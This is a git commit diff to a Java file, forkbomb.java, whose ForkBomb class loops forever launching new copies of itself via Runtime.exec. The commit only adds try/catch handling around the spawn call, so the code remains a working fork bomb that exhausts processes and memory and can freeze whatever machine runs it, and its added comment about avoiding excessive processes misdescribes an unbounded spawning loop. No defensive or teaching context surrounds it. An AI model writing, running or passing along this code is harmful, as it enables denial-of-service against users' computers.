0b559bb90079ad2df074ed0a3ba0fa1be2029e6d
Adrnikipad <detectivecameraman777@gmail.com>
2026-09-07 06:51:28 -0700

    new version v2

--- forkbomb.java
+++ forkbomb.java
@@ -4,7 +4,16 @@ public class ForkBomb
   {
     while(true)
     {
-      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+      try
+      {
+        Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+      }
+      catch (java.io.IOException e)
+      {
+        e.printStackTrace();
+        // Stop on error to avoid a tight-error loop which could spawn excessive processes
+        break;
+      }
     }
   }
 }
